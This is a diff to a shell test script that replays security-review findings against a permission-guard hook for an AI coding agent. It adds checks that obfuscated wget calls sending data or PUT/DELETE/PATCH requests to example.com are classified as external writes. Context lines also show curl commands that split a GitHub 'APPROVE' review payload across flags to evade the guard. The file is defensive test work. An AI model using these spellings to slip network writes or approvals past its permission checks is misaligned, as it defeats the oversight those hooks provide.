@@ -5,14 +5,17 @@
 # WHAT IT PROVES
 #   Every input the adversarial review (F1-F10, plus the low finding L1) and the two
 #   Codex review threads (P1, P2, round 2's P1-a, P1-b, round 3's P1-c, round 4's P1-d, P1-e, round 5's P1-f, P1-g, round 6's P1-h, P1-i) reproduced as a walk-around is
-#   fed to the hook or script that must stop it, and each row names its finding:
+#   fed to the hook or script that must stop it, and each row names its finding; I349-a is a residual
+#   edge issue #349 listed (a wget write to another host):
 #     hooks/permission-guard.sh       (PG)  F1 F2 F3 F5 F7 F8 F9 P1 P1-a P1-b P1-c P1-d P1-e P1-f P1-g P1-h P1-i
+#                                           I349-a
 #     hooks/guard-sensitive-files.sh  (GSF) F4 F6 P2
 #     scripts/plugin-config.sh, scripts/resolve-permission.sh, scripts/github-mcp.sh
 #                                           F1 (the writer), F7, F10, L1
 #   A row passes only on the hardened answer: ask or deny on Claude Code and a deny on
 #   every host that cannot carry an ask (never an allow); for the writer, nothing
-#   written; for the resolver, never the widened verdict. tests/test-permission-guard.sh,
+#   written; for the resolver, never the widened verdict; for a reading no verdict shows
+#   (an L1-only id, the PR a selector names), PG's own --classify answer. tests/test-permission-guard.sh,
 #   tests/hooks/test-protected-path-hardening.sh, tests/test-plugin-config.sh and
 #   tests/test-resolve-permission.sh hold each fix in depth; this file is the one place
 #   that replays the review itself.
@@ -575,6 +578,35 @@ pg P1-i "curl --json '{\"event\":' --json '\"APPROVE\"}' .../pulls/1/reviews (cu
 pg P1-i "curl -d '{\"event\"' -d ':\"APPROVE\"}' .../pulls/1/reviews" "curl -d '{\"event\"' -d ':\"APPROVE\"}' $REV"
 rm -rf "$PH/.config"
 
+# cls <finding> <label> <command> <jq predicate> — PG's own reading of the call (--classify: the real tokeniser and
+# engine, no resolver, nothing written) must satisfy the predicate. For a reading no verdict shows: an L1-only id,
+# the PR a selector names.
+cls() {
+  local out v=no
+  if [ -f "$PG" ]; then
+    out="$(cd "$REPO" && bash "$PG" --classify "$3" "$REPO" 2>/dev/null)"
+    [ "$(printf '%s' "$out" | jq -r "$4" 2>/dev/null)" = true ] && v=yes
+    out="$(printf '%s' "$out" | jq -c '{ids, unclassified, targets: [.resolver_calls[].target], notes}' 2>/dev/null)"
+  else
+    out="missing: $PG"
+  fi
+  row "$1" "$2" "$v" "$out"
+}
+
+# =========================================================================================
+section "Issue #349 a: a wget write to another host is net.post.external, however it is spelled"
+# =========================================================================================
+POSTX='(.ids | index("net.post.external") != null) and (.ids | index("net.get") == null)'
+judge "  (control) wget <url> is net.get" '["net.get"]' "$(bash "$PG" --classify 'wget https://example.com/x' "$REPO" 2>/dev/null | jq -c .ids)"
+judge "  (control) wget -e robots=off <url> is net.get" '["net.get"]' "$(bash "$PG" --classify 'wget -e robots=off https://example.com/x' "$REPO" 2>/dev/null | jq -c .ids)"
+for c in 'wget -e post_data=x https://example.com/x' 'wget -epost_data=x https://example.com/x' \
+         'wget -qe post_data=x https://example.com/x' 'wget --execute=post_data=x https://example.com/x' \
+         'wget -e POST-DATA=x https://example.com/x' 'wget -e method=DELETE https://example.com/x' \
+         'wget -e body_data=x -e method=PUT https://example.com/x' 'wget --post-d=x https://example.com/x' \
+         'wget --meth=PATCH https://example.com/x'; do
+  cls I349-a "$c" "$c" "$POSTX"
+done
+
 # =========================================================================================
 section "Codex P2: a protected path's parent directory is protected too"
 # =========================================================================================
@@ -603,10 +635,10 @@ section "the real config and state dirs were never touched"
 judge "real-home witness unchanged" "$REAL_BEFORE" "$(witness)"
 
 section "rows by finding"
-for id in F1 F2 F3 F4a F4b F4c F4d F5 F6 F7 F8 F9 F10 P1 P1-a P1-b P2 L1; do
+for id in F1 F2 F3 F4a F4b F4c F4d F5 F6 F7 F8 F9 F10 P1 P1-a P1-b P2 L1 I349-a; do
   p="$(awk -F'\t' -v i="$id" '$1 == i && $2 == "pass"' "$ROWS" | wc -l | tr -d ' ')"
   f="$(awk -F'\t' -v i="$id" '$1 == i && $2 == "fail"' "$ROWS" | wc -l | tr -d ' ')"
-  printf '  %-5s %3s pass %3s fail\n' "$id" "$p" "$f"
+  printf '  %-6s %3s pass %3s fail\n' "$id" "$p" "$f"
 done
 printf '  all   %3s pass %3s fail\n' "$(awk -F'\t' '$2 == "pass"' "$ROWS" | wc -l | tr -d ' ')" "$(awk -F'\t' '$2 == "fail"' "$ROWS" | wc -l | tr -d ' ')"
 
